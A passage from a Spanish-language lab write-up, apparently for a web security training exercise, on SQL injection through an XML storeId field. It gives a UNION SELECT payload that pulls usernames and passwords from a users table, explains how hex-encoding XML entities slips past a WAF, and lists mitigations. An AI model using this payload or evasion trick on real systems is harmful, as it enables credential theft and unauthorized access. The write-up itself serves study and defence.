Obtenemos la respuesta con el texto administrator~[PASSWORD]. Copiamos la contraseña y procedemos a iniciar sesión en la sección "My account", lo cual marca el laboratorio como resuelto.

Evidencia: Bypass Exitoso con Hackvertor

Explicación del payload

El payload utilizado es: 1 UNION SELECT username || '~' || password FROM users.

  • 1: Valor esperado para que la consulta original sea válida.
  • UNION SELECT: Comando para combinar los resultados originales con nuestra consulta.
  • username || '~' || password: Concatena el usuario y la clave en una sola cadena. Es necesario porque la aplicación solo devuelve una columna de resultados.
  • FROM users: Especifica la tabla objetivo.
  • Codificación XML (Entidades Hex): El payload se convierte a un formato tipo &#x53;&#x45;.... Esto engaña al WAF (que busca la palabra "SELECT" en plano), pero el servidor de base de datos recibe el texto ya decodificado por el parser XML y lo ejecuta.

Mitigación recomendada

  1. Consultas Parametrizadas: El motor de la base de datos debe tratar los datos del XML como literales y no como código SQL.
  2. Saneamiento XML: Configurar el analizador XML para validar que el contenido de etiquetas como <storeId> sea estrictamente numérico.
  3. Seguridad del WAF: Mejorar las reglas del Firewall para que realice una decodificación de entidades antes de inspeccionar el tráfico.
  4. Principio de Menor Privilegio: Asegurar que el usuario de la DB no tenga permisos para acceder a la tabla users innecesariamente.
